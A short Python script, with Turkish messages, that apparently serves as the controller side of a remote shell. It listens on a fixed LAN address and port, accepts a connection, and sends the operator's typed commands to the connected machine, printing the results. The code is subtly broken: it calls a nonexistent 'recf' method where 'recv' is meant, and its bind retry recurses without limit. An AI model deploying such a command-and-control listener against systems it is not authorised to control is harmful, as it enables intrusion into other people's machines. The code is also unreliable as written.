import socket
import sys


def create_socket():
    try:
        global host, port, s

        host = "192.168.1.2"
        port = 12345

        s = socket.socket()

    except socket.error as msg:
        print("Soket oluşturulurken hata:" + str(msg))


def bind_socket():
    try:
        global host, port, s
        print("Bind ediliyor   " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Bind hatası" + str(msg) + "\n" + "Tekrar deneniyor...")
        bind_socket()


def socket_accept():
    conn, addr = s.accept()
    print("Bağlandı!!!" + "  IP:" + addr[0] + "    PORT:" + str(addr[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recf(1024), "utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
